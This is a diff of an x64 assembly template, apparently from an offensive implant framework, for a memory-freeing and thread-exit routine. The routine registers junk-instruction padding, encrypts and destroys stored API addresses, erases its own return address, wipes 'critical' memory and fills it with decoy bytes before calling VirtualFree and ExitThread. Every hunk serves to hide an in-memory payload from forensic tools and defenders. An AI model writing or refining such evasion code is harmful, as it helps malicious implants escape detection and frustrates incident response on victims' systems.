@@ -2,7 +2,8 @@
 
 // notice:
 //   if VirtualProtect is zero, skip adjust page protect
-//   the CriticalSize must be 8 bytes aligned
+//   if DecoyAddress or DecoySize is zero, skip fill decoy
+//   CriticalSize must be 8 bytes aligned
 
 // struct:
 //   ======== Sleep ========                               ======== Free ========
@@ -147,6 +148,10 @@ method_free:
   // generate crypto key from registers
   call gen_key                                 {{iji}}
 
+  // erase return address
+  xor {{.RegV.rcx}}, {{.RegV.rcx}}             {{iji}}
+  mov [rsp + 3*8], {{.RegV.rcx}}               {{iji}}
+
   // encrypt address of VirtualFree and ExitThread
   xor [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}     {{iji}}
   xor [{{.RegN.rbp}} + 3*8], {{.RegN.rbx}}     {{iji}}
@@ -160,7 +165,7 @@ method_free:
   xor [{{.RegN.rbp}} + 3*8], {{.RegN.rbx}}     {{iji}}
 
   // destroy address of VirtualProtect
-  and [{{.RegN.rbp}} + 1*8], {{.RegN.rbx}}     {{iji}}
+  or [{{.RegN.rbp}} + 1*8], {{.RegN.rbx}}      {{iji}}
 
   // erase critical memory and deploy decoy
   call decoy                                   {{iji}}
@@ -181,7 +186,7 @@ method_free:
   xor [{{.RegN.rbp}} + 3*8], {{.RegN.rbx}}     {{iji}}
 
   // destroy address of VirtualFree
-  and [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}     {{iji}}
+  or [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}      {{iji}}
 
   // exit current thread
   mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // get address of ExitThread
@@ -218,10 +223,9 @@ xor_buf:
   ret                                          {{iji}}
 
 protect:
-  // check VirtualProtect is zero
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 1*8]     {{iji}}
-  test {{.RegV.rax}}, {{.RegV.rax}}            {{iji}}
-  jz skip_protect                              {{iji}}
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 1*8]     {{iji}} // get VirtualProtect address
+  test {{.RegV.rax}}, {{.RegV.rax}}            {{iji}} // check VirtualProtect address is zero
+  jz skip_protect                              {{iji}} // check need skip protect
   xor {{.RegV.rax}}, {{.RegV.rax}}             {{iji}} // clear register about VirtualProtect
   push {{.RegN.rdi}}                           {{iji}} // save non-volatile register
   mov {{.RegN.rdi}}, [{{.RegN.rbp}} + 1*8]     {{iji}} // get address of VirtualProtect
@@ -254,11 +258,14 @@ decoy:
   jnz loop_erase                               {{iji}} // check need erase next
 
   // fill critical memory with decoy
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // set decoy address
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // get decoy address
+  test {{.RegV.rcx}}, {{.RegV.rcx}}            {{iji}} // check decoy address is zero
+  jz skip_decoy                                {{iji}} // check need skip fill
   mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 7*8]     {{iji}} // set decoy size (loop count)
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
   test {{.RegV.rdx}}, {{.RegV.rdx}}            {{iji}} // check decoy size is zero
   jz skip_decoy                                {{iji}} // check need skip fill
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
+
  loop_decoy:
   movzx {{.RegV.r8}}, byte ptr [{{.RegV.rcx}}] {{iji}} // load one byte from decoy
   mov [{{.RegV.rax}}], {{.RegV.r8b}}           {{iji}} // write one byte to critical
